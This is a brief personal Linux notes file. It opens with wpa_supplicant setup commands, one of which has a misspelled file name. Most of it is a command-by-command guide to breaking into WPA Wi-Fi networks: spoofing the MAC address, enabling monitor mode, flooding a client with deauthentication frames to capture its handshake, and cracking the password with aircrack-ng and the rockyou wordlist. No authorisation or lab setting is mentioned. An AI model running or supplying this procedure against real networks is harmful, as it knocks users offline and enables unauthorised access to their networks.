[[LINUX]]
# wlan

## adding wlan interface and configuring
```
cp /etc/wpa_supplicant/wpa_supplicamt.conf /etc/wpa_supplicant/wpa_supplicant-<DEVICE>.conf

sudo ip link set up <INTERFACE_NAME>

wpa_passphrase <MYSSID> <KEY> >> /etc/wpa_supplicant/wpa_supplicant-<DEVICE_NAME>.conf

sudo wpa_supplicant -B -i <DEVICE> -c /etc/wpa_supplicant/wpa_supplicant-DEVICE.conf
```

## checking for other wifi signals
### wavemon


### airodump-ng
- install `aircrack-ng`

- put wifi interface in monitor mode:
  ```
  ifconfig WLAN down
  macchanger -r WLAN
  iwconfig WLAN mode monitor
  ifconfig WLAN up
  ```
  **OR**
  `airmon-ng start WLAN`
  
- now monitor the wifi signals 
  `airodump-ng WLAN`

## catch the handshake
open two terminals.  
- start airmon-ng on the 1st
  `airodump-ng WLAN --bssid BSSID -c CHANNEL --write FILENAME`  

- start aireplay-ng on the second in order to deauthenticate the client, forcing
  it to reconnect and retrieving the handshake as a consequence.
  `aireplay-ng --deauth 0 -a BSSID -c CLIENT WLAN`

## crack the password
`aircrack-ng FILENAME -w /usr/share/wordlist/rockyou.txt`
